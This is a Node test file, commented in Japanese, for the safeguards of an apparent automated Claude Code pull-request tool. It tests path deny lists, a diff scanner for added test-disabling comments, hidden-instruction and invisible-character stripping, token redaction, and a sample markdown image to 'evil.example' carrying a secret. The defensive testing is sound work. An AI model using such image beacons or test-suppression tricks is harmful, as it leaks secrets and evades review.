// lib/ の部品のテスト（node --test）
import assert from "node:assert/strict";
import { createVerify, generateKeyPairSync } from "node:crypto";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { test } from "node:test";
import { splitList } from "../lib/actions.mjs";
import { normalizeForMatch, parseHunks, scanDiffText } from "../lib/diff-scan.mjs";
import { marker, readMarker } from "../lib/escalation.mjs";
import { parseRawDiff } from "../lib/git.mjs";
import { DEFAULT_TEST_PATHS, extractImports, FIXED_DENY_PATHS, globToRegExp, matcher, PROTECTED_PATHS, resolveImport } from "../lib/paths.mjs";
import { baseSkills, classifyClaudeFailure, failureDiagnostics } from "../lib/claude.mjs";
import { appJwt, makeTokenSource } from "../lib/pr-token.mjs";
import { triggerLabelIfOurs } from "../lib/github.mjs";
import { codeBlock, hasClosingOrMention, sanitizeOutbound, stripInvisible } from "../lib/sanitize.mjs";

test("パターン: ** は0個以上の階層、* は / を越えない", () => {
  const m = (p, s, o) => globToRegExp(p, o).test(s);
  assert.ok(m("src/**", "src/a/b.js"));
  assert.ok(m("src/**", "src/a.js"));
  assert.ok(!m("src/**", "lib/src/a.js"));
  assert.ok(m("**/test/**", "test/a.js"));
  assert.ok(m("**/test/**", "packages/x/test/a.js"));
  assert.ok(m("**/*.test.*", "a.test.js"));
  assert.ok(m("**/*.test.*", "src/deep/a.test.ts"));
  assert.ok(!m("src/*.js", "src/a/b.js"));
  assert.ok(m("**/CLAUDE.md", "CLAUDE.md"));
  assert.ok(m("**/CLAUDE.md", "sub/dir/CLAUDE.md"));
  assert.ok(!m("**/CLAUDE.md", "sub/XCLAUDE.md"));
  assert.ok(m("**/.claude/**", "sub/.claude/settings.json"));
  assert.ok(m("**/tsconfig*.json", "tsconfig.build.json"));
  assert.ok(!m("**/makefile", "Makefile"));
  assert.ok(m("**/makefile", "Makefile", { nocase: true }));
  assert.ok(m("a?c", "abc") && !m("a?c", "a/c"));
});

test("テストのファイルの既定のパターン", () => {
  const isTest = matcher(DEFAULT_TEST_PATHS, { nocase: true });
  for (const p of ["src/a.test.js", "tests/x.py", "src/test/java/FooTest.java", "pkg/a_test.go", "test_x.py", "__snapshots__/a.snap", "a.cy.ts", "fixtures/data.json", "src/__fixtures__/x"]) {
    assert.ok(isTest(p), p);
  }
  for (const p of ["src/a.js", "src/testament.js", "README.md"]) assert.ok(!isTest(p), p);
});

test("固定の除外ファイルと変更禁止ファイル", () => {
  const deny = matcher(FIXED_DENY_PATHS, { nocase: true });
  const prot = matcher(PROTECTED_PATHS, { nocase: true });
  for (const p of [".github/workflows/ci.yml", "docs/CODEOWNERS", "package.json", "sub/package-lock.json", "vitest.workspace.ts", "src/conftest.py", ".coveragerc", "sub/.claude/skills/x/SKILL.md", "stryker.config.json", "Makefile", "go.sum", "sub/GEMINI.md"]) {
    assert.ok(deny(p), p);
  }
  for (const p of ["src/index.js", "tests/a.test.js", "README.md"]) assert.ok(!deny(p), p);
  assert.ok(prot("sub/AGENTS.md"));
  assert.ok(prot(".mcp.json"));
  for (const p of ["CODEOWNERS", "docs/CODEOWNERS", ".github/CODEOWNERS"]) assert.ok(prot(p), p);
  assert.ok(!prot("package.json"));
});

test("git diff --raw --no-renames -z を読む", () => {
  const out = ":100644 100644 aaa bbb M\0src/a.js\0:000000 120000 000 ccc A\0link\0:100644 000000 ddd 000 D\0old.txt\0";
  const e = parseRawDiff(out);
  assert.deepEqual(e.map((x) => [x.status, x.path, x.newMode]), [["M", "src/a.js", "100644"], ["A", "link", "120000"], ["D", "old.txt", "000000"]]);
});

test("追加した行の無効化の書き方を、行をつないで空白を除いて拾う", () => {
  const diff = [
    "diff --git a/src/a.rs b/src/a.rs",
    "--- a/src/a.rs",
    "+++ b/src/a.rs",
    "@@ -1,0 +2,2 @@",
    "+#[cfg_attr(test,",
    "+  allow(dead_code))]",
    "diff --git a/src/b.js b/src/b.js",
    "--- a/src/b.js",
    "+++ b/src/b.js",
    "@@ -3 +3,0 @@",
    "-// Stryker restore all",
    "@@ -9,0 +9 @@",
    "+// ESLint-Disable-Next-Line",
    "diff --git a/README.md b/README.md",
    "--- a/README.md",
    "+++ b/README.md",
    "@@ -1,0 +1 @@",
    "+![x](https://evil.example/p.png?d=secret)",
  ].join("\n");
  const found = scanDiffText(diff);
  assert.ok(found.some((f) => f.startsWith("src/a.rs") && f.includes("cfg_attr(")));
  assert.ok(found.some((f) => f.startsWith("src/b.js") && f.includes("削除した行") && f.includes("strykerrestore")));
  assert.ok(found.some((f) => f.startsWith("src/b.js") && f.includes("eslint-disable")));
  assert.ok(found.some((f) => f.startsWith("README.md") && f.includes("外の画像")));
  assert.equal(scanDiffText("diff --git a/x b/x\n+++ b/x\n@@ -1 +1 @@\n+const a = 1;\n").length, 0);
});

test("ハンクを、続けて追加した行と削除した行の塊に分ける", () => {
  const f = parseHunks("diff --git a/x b/x\n+++ b/x\n@@ -1,2 +1,2 @@\n-a\n-b\n+c\n+d\n e\n+f\n");
  assert.deepEqual(f[0].deleted, ["a\nb"]);
  assert.deepEqual(f[0].added, ["c\nd", "f"]);
  assert.equal(normalizeForMatch(" A b\n C "), "abc");
});

test("@ の取り込み先を拾う。コードの中は除く", () => {
  const t = "読む: @docs/rules.md と @./a.md\n`@not/this.md`\n```\n@nor/this.md\n```\nメール a@b.com\n@~/home.md\n";
  assert.deepEqual(extractImports(t), ["docs/rules.md", "./a.md", "~/home.md"]);
  assert.equal(resolveImport("sub/CLAUDE.md", "../docs/x.md"), "docs/x.md");
  assert.equal(resolveImport("sub/CLAUDE.md", "./x.md"), "sub/x.md");
  assert.equal(resolveImport("CLAUDE.md", "../x.md"), null);
  assert.equal(resolveImport("CLAUDE.md", "~/x.md"), null);
});

test("画面に出ない文字を除く", () => {
  assert.equal(stripInvisible("a<!-- 隠した指示 -->b\u200Bc\u202Ed"), "abcd");
  assert.equal(stripInvisible("a<!-- 閉じない"), "a");
});

test("外に出す文面: 認証情報、画像、HTML、リンク、@、Issue を閉じるキーワード", () => {
  const s = sanitizeOutbound("token=ghs_abcdefghijklmnop ![i](https://x/y.png) <img src=x> [l](https://e.com) @alice closes #3", ["ghs_abcdefghijklmnop"]);
  assert.ok(!s.includes("ghs_abcdefghijklmnop"));
  assert.ok(!s.includes("!["));
  assert.ok(!s.includes("<img"));
  assert.ok(!s.includes("@alice"));
  assert.ok(s.includes("＠alice"));
  assert.ok(!/closes #3/i.test(s));
  assert.ok(s.includes("`https://e.com`"));
});

test("コードブロックは、中のバッククォートより長い囲みにする", () => {
  assert.equal(codeBlock("a ``` b"), "````text\na ``` b\n````");
});

test("コミットのメッセージの、Issue を閉じるキーワードと @", () => {
  assert.ok(hasClosingOrMention("fix: x\n\nCloses #12"));
  assert.ok(hasClosingOrMention("resolves owner/repo#1"));
  assert.ok(hasClosingOrMention("thanks @bob"));
  assert.ok(!hasClosingOrMention("merge-while-you-sleep: implement"));
  assert.ok(!hasClosingOrMention("fix the parser"));
});

test("目印のコメントを書いて読む", () => {
  process.env.GITHUB_RUN_ID = "42";
  const m = readMarker(`本文\n${marker("draft", { questions: 2 })}`);
  assert.equal(m.kind, "draft");
  assert.equal(m.run_id, "42");
  assert.equal(m.questions, 2);
  assert.equal(readMarker("目印なし"), null);
});

test("一覧の入力", () => {
  assert.deepEqual(splitList("a, b\n# 注釈\n\nc"), ["a", "b", "c"]);
});

test("ハンクの中の、内容が「++ 」で始まる追加した行も照合する", () => {
  const diff = [
    "diff --git a/src/a.js b/src/a.js",
    "--- a/src/a.js",
    "+++ b/src/a.js",
    "@@ -1,0 +1,2 @@",
    "+++ i; // Stryker disable all",
    "--- j; // c8 ignore stop",
  ].join("\n");
  const found = scanDiffText(diff);
  assert.ok(found.some((f) => f.startsWith("src/a.js") && f.includes("strykerdisable")), JSON.stringify(found));
  assert.ok(found.some((f) => f.startsWith("src/a.js") && f.includes("削除した行") && f.includes("c8ignorestop")), JSON.stringify(found));
});

test("テストのパターンは大文字小文字を区別する ── src/latest.js をテストとみなさない", () => {
  const isTest = matcher(DEFAULT_TEST_PATHS);
  for (const p of ["src/latest.js", "src/contest.ts", "lib/fastest.py", "src/protest.go"]) assert.ok(!isTest(p), p);
  for (const p of ["src/FooTest.java", "src/FooTests.cs", "src/a.test.js"]) assert.ok(isTest(p), p);
});

test("App の JWT は RS256 で署名し、期限は10分より短い", () => {
  const { privateKey, publicKey } = generateKeyPairSync("rsa", { modulusLength: 2048 });
  const pem = privateKey.export({ type: "pkcs1", format: "pem" });
  const jwt = appJwt("Iv1.abc", pem, 1000000);
  const [h, b, s] = jwt.split(".");
  assert.deepEqual(JSON.parse(Buffer.from(h, "base64url")), { alg: "RS256", typ: "JWT" });
  const body = JSON.parse(Buffer.from(b, "base64url"));
  assert.equal(body.iss, "Iv1.abc");
  assert.ok(body.exp - 1000000 <= 600);
  assert.ok(createVerify("RSA-SHA256").update(`${h}.${b}`).verify(publicKey, Buffer.from(s, "base64url")));
});

test("Claude Code の失敗: HTTP のステータスで分け、ログに出す項目から認証情報を消す", () => {
  const p = { api_error_status: 401, subtype: "success", terminal_reason: "api_error", result: "Failed to authenticate. API Error: 401 Invalid bearer token" };
  assert.equal(classifyClaudeFailure({ code: 1, err: "" }, p).reason, "interrupted");
  assert.equal(classifyClaudeFailure({ code: 1, err: "" }, { api_error_status: 429 }).reason, "limit_reached");
  assert.equal(classifyClaudeFailure({ code: 1, err: "" }, { result: "max_tokens に達した" }), null, "token の語だけでは認証の失敗にしない");
  const d = failureDiagnostics({ code: 1, err: "boom sk-ant-oat01-SECRETSECRET\nline2" }, p, ["sk-ant-oat01-SECRETSECRET"]);
  assert.ok(!d.includes("SECRETSECRET"), d);
  assert.match(d, /api_error_status 401/);
});

test("基準コミットのスキル: 名前ごとに許し、hooks を書いたものと名前の崩れたものは許さない", () => {
  const ws = mkdtempSync(join(tmpdir(), "skills-"));
  const files = [];
  const put = (p, s) => {
    mkdirSync(dirname(join(ws, p)), { recursive: true });
    writeFileSync(join(ws, p), s);
    files.push(p);
  };
  put(".claude/skills/fmt/SKILL.md", "---\nname: format\ndescription: x\nallowed-tools: Bash\n---\nbody");
  put(".claude/skills/plain/SKILL.md", "body only");
  put(".claude/skills/crlf/SKILL.md", "\uFEFF---\r\ndescription: x\r\n---\r\nbody");
  put(".claude/commands/frontend/component.md", "---\ndescription: x\n---\n");
  put("docs/SKILL.md", "not a skill");
  // 外すもの
  put("sub/.claude/skills/hooked/SKILL.md", "---\ndescription: x\nhooks:\n  PreToolUse: []\n---\n");
  put(".claude/skills/open/SKILL.md", "---\ndescription: never closed\n");
  put(".claude/skills/bad/SKILL.md", "---\nname: a)b\n---\n");
  put(".claude/skills/spaced/SKILL.md", "---\nname: my skill\n---\n");
  put(".claude/skills/trail/SKILL.md", "--- \nhooks:\n  a: 1\n---\n");
  put(".claude/skills/quoted/SKILL.md", "---\n\"hooks\": {}\n---\n");
  put(".claude/skills/flow/SKILL.md", "---\n{description: x, hooks: {a: 1}}\n---\n");
  // 同じ名前の、hooks の無いものと有るもの
  put(".claude/skills/dup/SKILL.md", "---\ndescription: x\n---\n");
  put("pkg/.claude/skills/dup/SKILL.md", "---\nhooks:\n  a: 1\n---\n");
  put(".claude/skills/alias/SKILL.md", "---\nname: deploy\n---\n");
  put("pkg/.claude/skills/deploy/SKILL.md", "---\nhooks:\n  a: 1\n---\n");
  const r = baseSkills(ws, files);
  rmSync(ws, { recursive: true, force: true });
  assert.deepEqual(r.allowed, ["alias", "crlf", "fmt", "format", "frontend:component", "plain"]);
  for (const name of ["hooked", "open", "bad", "spaced", "trail", "quoted", "flow", "pkg/.claude/skills/dup", "pkg/.claude/skills/deploy"]) {
    assert.ok(r.excluded.some((e) => e.includes(name)), name);
  }
});

test("PR 用トークン: 発行し直した分も含めて、発行した全部を取り消す", async () => {
  const { privateKey } = generateKeyPairSync("rsa", { modulusLength: 2048, privateKeyEncoding: { type: "pkcs8", format: "pem" }, publicKeyEncoding: { type: "spki", format: "pem" } });
  const saved = { fetch: globalThis.fetch, now: Date.now, repo: process.env.GITHUB_REPOSITORY };
  process.env.GITHUB_REPOSITORY = "o/r";
  let n = 0;
  const revoked = [];
  globalThis.fetch = async (url, opts) => {
    const auth = opts.headers.authorization.slice(7);
    let body = {};
    if (url.endsWith("/installation") && opts.method === "GET") body = { id: 1 };
    else if (url.endsWith("/access_tokens")) body = { token: `tok${++n}` };
    else if (url.endsWith("/installation/token") && opts.method === "DELETE") revoked.push(auth);
    return new Response(JSON.stringify(body), { status: 200, headers: { "content-type": "application/json" } });
  };
  try {
    let now = 1_000_000;
    Date.now = () => now;
    const src = makeTokenSource({ clientId: "c", privateKey, permissions: {} });
    assert.equal(await src.get(), "tok1");
    now += 46 * 60000;
    assert.equal(await src.get(), "tok2");
    await src.revoke();
    assert.deepEqual(revoked.sort(), ["tok1", "tok2"]);
  } finally {
    globalThis.fetch = saved.fetch;
    Date.now = saved.now;
    if (saved.repo === undefined) delete process.env.GITHUB_REPOSITORY;
    else process.env.GITHUB_REPOSITORY = saved.repo;
  }
});

test("起動ラベル: この実行のものか確かめられないときは外さない", async () => {
  const saved = process.env.GITHUB_REPOSITORY;
  process.env.GITHUB_REPOSITORY = "o/r";
  const L = { trigger: "run" };
  const failing = { get: async () => { throw new Error("api"); }, graphql: async () => { throw new Error("api"); } };
  try {
    assert.deepEqual(await triggerLabelIfOurs(failing, 1, L), []);
  } finally {
    if (saved === undefined) delete process.env.GITHUB_REPOSITORY;
    else process.env.GITHUB_REPOSITORY = saved;
  }
});
